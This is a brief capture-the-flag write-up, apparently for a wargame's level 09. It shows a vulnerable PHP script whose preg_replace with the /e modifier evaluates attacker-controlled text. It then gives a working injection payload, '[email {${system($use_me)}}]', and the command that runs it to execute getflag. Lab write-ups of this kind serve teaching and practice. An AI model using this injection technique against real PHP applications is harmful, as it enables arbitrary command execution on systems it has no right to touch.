# level 09

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

With some research we find that "preg_replace" is deprecated due to security
problem, because in combination with "/e" it evaluate the string as php and
execute it. So we could use "system()" a php function that execute bash command
and print the output to the terminal to run "getflag".

test.txt:

```php
[email {${system($use_me)}}]
```

then run:

```bash
/home/flag09/flag09 /home/level09/test.txt getflag
```
